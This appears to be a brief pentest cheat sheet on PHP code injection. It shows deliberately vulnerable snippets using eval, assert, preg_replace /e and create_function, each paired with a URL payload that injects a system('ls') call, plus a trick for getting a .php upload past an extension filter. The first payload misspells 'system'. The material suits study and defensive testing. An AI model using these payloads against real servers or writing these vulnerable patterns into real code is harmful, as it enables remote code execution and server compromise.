###### `#` needs to be encoded when attacks are used through urls

#### Beware of the following functions : 
##eval

```
<?php 
  $str="echo \"Hello ".$_GET['name']."!!!\";";
  eval($str);
?>
```

_[attack]_ = `URL?name=";syslem("ls");#`

##assert()  - identical to eval()
```
<?php
  assert(trim("'".$_GET['name']."'"));
  echo "Hello ".htmlentities($_GET['name']);
?> 
```
_[attack]_ = `URL?name='.system("ls");#`

##preg_replace (with /e modifier) => preg_replace('/.*/e',...) - /e does an eval() on the match
```
<?php
    echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
?>
```
_[attack]_ = `URL?pattern=/.*/e&new=system("ls")&base=something`

##create_function
```
<?php
   usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
?>
```
_[attack]_ = `?order=id);}system('ls');#`

include[_once] / require[_once] 

WildCard :  A .php file can be uploaded bypassing preg_match('/\.php$/',$file) by name the file as .php2 or 	            .php.blah so that apche doesn't know to handle the extension move to next one and run the php code 
